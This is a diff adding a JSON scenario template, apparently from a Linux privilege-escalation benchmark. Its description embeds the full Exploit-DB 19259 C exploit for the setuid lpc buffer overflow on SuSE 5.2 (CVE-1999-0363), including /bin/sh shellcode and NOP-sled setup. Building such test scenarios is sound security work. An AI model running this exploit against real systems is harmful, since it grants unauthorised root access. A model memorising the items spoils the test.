@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_19259",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: S.u.S.E Linux 5.2 - 'lpc' Local Privilege Escalation (CVE-1999-0363;OSVDB-977)\n\nExploit source code (19259.c):\n```\n// source: https://www.securityfocus.com/bid/328/info\n\n\nThe PLP Line Printer Control program, shipped with S.u.S.E. 5.2 is vulnerable to a local remote buffer overflow. You can determine whether you're vulnerable or not by typing 'lpc'. If you're presented with an lpc version number, you're vulnerable. The consequences of lpc exploitation are root access for a local user.\n\n/*\n\nStandard overflow for x86 linux lpc. PLP Line Printer Control program, version 4.0.3. Tested on SuSE 5.2 (suidroot). Test your copy of /usr/bin/lpc by trying an /usr/bin/lpc attach lp `perl -e \"print 'A' x 1000\"`;lpc status lp The problematic code is in displayq.c and control_ops.c, where we attempt to fscanf() the lockfile's contents into a fixed length buffer. See the Bugtraq post for full fix information(www.geek-girl.com/bugtraq).\n\nThe buffer we're overflowing is 256bytes, and an offset of 0 works just fine. Try in increments of +-100 if it doesn't work for you.\n\nObviously this is a complete rip of Aleph1's standard overflow program from his paper \"smashing the stack for fun and profit\".\n\nto compile: gcc -o xnec_lpc xnec_lpc.c\n\nbugs: only sets uid=0, and you may have to have a printer defined (lp on my box).\n\ngreets to #sk1llz\n\n-xnec xnec on EF and DALnet, xnec@inferno.tusculum.edu\n\n*/ #include <stdlib.h>\n\n#define DEFAULT_OFFSET 0\n\n#define DEFAULT_BUFFER_SIZE 356\n\n#define DEFAULT_EGG_SIZE 2048\n\n#define NOP 0x90\n\nchar pause;\n\nchar shellcode[] =\n\n\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\"\n\n\"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\"\n\n\"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\";\n\nunsigned long get_esp(void) {\n\n__asm__(\"movl %esp,%eax\");\n\n}\n\nvoid main(int argc, char *argv[]) {\n\nchar *buff, *ptr, *egg;\n\nlong *addr_ptr, addr;\n\nint offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;\n\nint i, eggsize=DEFAULT_EGG_SIZE;\n\nif (argc > 1) bsize = atoi(argv[1]);\n\nif (argc > 2) offset = atoi(argv[2]);\n\nif (argc > 3) eggsize = atoi(argv[3]);\n\nif (!(buff = malloc(bsize))) {\n\nprintf(\"Can't allocate memory.\\n\");\n\nexit(0);\n\n}\n\nif (!(egg = malloc(eggsize))) {\n\nprintf(\"Can't allocate memory.\\n\");\n\nexit(0);\n\n}\n\naddr = get_esp() - offset;\n\nprintf(\"Using address: 0x%x\\n\", addr);\n\nprintf(\"\\nPLP Line Printer Control program, version 4.0.3 overflow.\\n\");\n\nprintf(\"Bug found by xnec, code ripped from Aleph1. After running this program, simply compile and run:\\n---\\n\n\n#include <unistd.h>\n\nvoid main(){system(\\\"/bin/bash\\\");}\\n---\\n\");\n\nscanf(\"%c\", pause);\n\nptr = buff;\n\naddr_ptr = (long *) ptr;\n\nfor (i = 0; i < bsize; i+=4)\n\n*(addr_ptr++) = addr;\n\nptr = egg;\n\nfor (i = 0; i < eggsize - strlen(shellcode) - 1; i++)\n\n*(ptr++) = NOP;\n\nfor (i = 0; i < strlen(shellcode); i++)\n\n*(ptr++) = shellcode[i];\n\nbuff[bsize - 1] = '\\0';\n\negg[eggsize - 1] = '\\0';\n\nmemcpy(egg,\"EGG=\",4);\n\nputenv(egg);\n\nmemcpy(buff,\"RET=\",4);\n\nputenv(buff);\n\nsystem(\"`which lpc` attach lp $RET; `which lpc` status lp\");\n\n}\n```",
+  "cve": "CVE-1999-0363;OSVDB-977",
+  "exploitdb_id": "19259",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_19259",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
